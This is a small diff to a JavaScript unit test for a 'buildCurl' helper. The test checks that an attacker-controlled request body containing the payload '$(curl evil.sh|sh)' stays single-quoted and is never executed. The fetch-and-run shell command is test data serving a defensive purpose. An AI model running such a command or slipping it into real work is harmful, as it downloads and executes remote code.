@@ -34,7 +34,7 @@ describe('buildCurl', () => {
   it('neutralises command injection from an attacker-controlled body', () => {
     const out = buildCurl(ev({ body: '{"a":"$(curl evil.sh|sh)"}' }))
     // The payload is single-quoted, so no $(...) survives unquoted.
-    expect(out).toContain("--data '{\"a\":\"$(curl evil.sh|sh)\"}'")
+    expect(out).toContain('--data \'{"a":"$(curl evil.sh|sh)"}\'')
     expect(out).not.toMatch(/--data "/) // never double-quoted
   })
 
